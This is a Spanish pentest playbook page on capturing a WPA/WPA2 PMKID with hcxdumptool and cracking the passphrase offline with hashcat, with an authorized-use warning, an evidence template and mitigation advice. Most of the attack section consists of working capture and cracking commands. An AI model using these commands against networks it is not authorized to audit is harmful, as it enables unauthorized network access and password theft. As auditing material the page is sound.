# PMKID

> Técnica: capturar PMKID para validar fortaleza de WPA/WPA2-Personal sin depender de clientes conectados.

!!! warning "Uso autorizado"
    Ejecutar únicamente sobre redes propias, laboratorios o auditorías autorizadas.

---

## Cuándo usar

- Red WPA/WPA2-Personal.
- No hay clientes conectados.
- El AP expone PMKID.
- Se quiere probar cracking offline.
- Se dispone de adaptador compatible.

---

## Variables

```bash
export IFACE="wlan0"
export MON_IFACE="wlan0mon"
export BSSID="AA:BB:CC:DD:EE:FF"
export CHANNEL="6"
export OUTDIR="$PWD/evidence"
mkdir -p "$OUTDIR"
```

---

## Captura con hcxdumptool

```bash
sudo hcxdumptool \
  -i "$MON_IFACE" \
  -o "$OUTDIR/pmkid.pcapng" \
  --enable_status=1
```

Para enfocar objetivo, crea una lista con el BSSID:

```bash
echo "$BSSID" | tr -d ':' > "$OUTDIR/filter.txt"
```

```bash
sudo hcxdumptool \
  -i "$MON_IFACE" \
  -o "$OUTDIR/pmkid.pcapng" \
  --filterlist_ap="$OUTDIR/filter.txt" \
  --filtermode=2 \
  --enable_status=1
```

---

## Convertir a hashcat

```bash
hcxpcapngtool \
  -o "$OUTDIR/pmkid.hc22000" \
  "$OUTDIR/pmkid.pcapng"
```

Comprobar:

```bash
ls -lah "$OUTDIR/pmkid.hc22000"
head "$OUTDIR/pmkid.hc22000"
```

---

## Cracking offline

```bash
hashcat -m 22000 "$OUTDIR/pmkid.hc22000" wordlist.txt
```

Mostrar resultado:

```bash
hashcat -m 22000 "$OUTDIR/pmkid.hc22000" --show
```

---

## Usando Airgeddon

Flujo típico:

```text
1. Seleccionar interfaz
2. Activar modo monitor
3. Seleccionar objetivo autorizado
4. Elegir PMKID attack
5. Capturar PMKID
6. Convertir/validar hash
7. Cracking offline autorizado
```

---

## Qué buscar

| Señal | Interpretación |
|---|---|
| `.pcapng` generado | Captura disponible |
| `.hc22000` con contenido | PMKID/handshake convertido |
| Hashcat recupera passphrase | Contraseña débil |
| No se genera hash | AP puede no exponer PMKID |
| Canal incorrecto | Captura incompleta |

---

## Evidencia mínima

```text
SSID:
BSSID:
Canal:
Técnica: PMKID
Fichero pcapng:
Fichero hc22000:
Resultado:
Impacto:
```

---

## Falsos positivos / errores comunes

- No todos los APs exponen PMKID.
- No obtener PMKID no significa que la red sea segura.
- Capturar en canal incorrecto.
- Usar interfaz sin soporte adecuado.
- Confundir PMKID con handshake tradicional.
- Publicar hashes completos en notas públicas.

---

## Mitigación

- Usar passphrases largas y aleatorias.
- Evitar SSID comunes con contraseñas débiles.
- Usar WPA3-SAE cuando sea viable.
- Deshabilitar configuraciones legacy.
- Monitorizar actividad anómala.